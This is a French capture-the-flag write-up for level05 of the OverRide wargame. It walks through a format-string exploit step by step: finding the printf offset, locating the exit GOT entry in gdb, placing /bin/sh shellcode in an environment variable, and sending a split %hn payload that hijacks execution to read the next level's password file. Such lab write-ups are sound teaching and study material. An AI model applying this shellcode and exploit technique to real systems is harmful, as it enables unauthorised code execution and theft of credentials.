En de-compilant le programme on ce rend compte que l'on peux exécuter un shellcode avec un __printf__ pas sécurisé.

---
On vas donc chercher __offset__ du __printf__:

``` bash 
level05@OverRide:~$ python -c 'print "AAAA" + " %p " * 15' | ./level05
aaaa 0x64  0xf7fcfac0  (nil)  (nil)  (nil)  (nil)  0xffffffff  0xffffd344  0xf7fdb000  => 0x61616161 <=  0x20702520  0x20702520  0x20702520  0x20702520  0x20702520
```

on trouve donc un offset de ==10==

---
Avec ceci et le faite qu'il y ai un __exit()__ dans le programe on vas chercher l'addresse de celui-ci:

``` bash
level05@OverRide:~$ gdb ./level05
(gdb) info func exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

on obtient donc l'addresse ==0x80497e0==

---

Ensuite nous allons placer le __shellcode__ dans un variable d'envionnement et chercher son addresse:
(shellcode qui execute un "__/bin/sh__")
``` bash 
export SHELLCODE=$(python -c 'print "\x90"*1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

programe pour recup l'addresse:

```c
  #include <stdio.h>
  #include <stdlib.h>

  int main(int argc, char** argv)
  {
    printf("env address at %p\n", getenv(argv[1]));
    return (0);
  }

```

``` bash
level05@OverRide:~$ ./a.out SHELLCODE
env address at 0xffffd4d7 
```

---
Avec c'est info on peux enfin exécute notre shellcode, a une exception prés. Le shellcode ce trouve trop loin dans les adresse du coup on vas devoir découper le décalage en deux pour le pas overflow celui-ci.

on vas donc découper l’adresse en deux :

> adresse : 0xffffd4d7
> première parti: 0xffff conversion en décimal -> 65535
> deuxième parti: 0xd4d7 conversion en décimal -> 54487

On a découpé l'adresse en deux ce qui donne 2 fois 2 octets. On vas donc écrire la première parti de l'adresse sur l'adresse de __exit()__ puis sur l'adresse deux plus loin.

premier decalage 54487 - 8 = 54479
deuxieme decalage 65535 - 54487 = 11048

* tout ce qu'on écrie avant les deux décalage dois être soustrait pour celui-ci

> (python -c 'print "[exit address]" + "[exit address + 2]" + "%[first decalage]x" + "%10$08hn" + "%[second decalage]x" + "%11$08hn"' ; cat -) | ./level05

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54479x" + "%10$08hn" + "%11048x" + "%11$08hn"' ; cat -) | ./level05
```

il nous reste plus cas executer :

```bash
cat /home/users/level06/.pass
```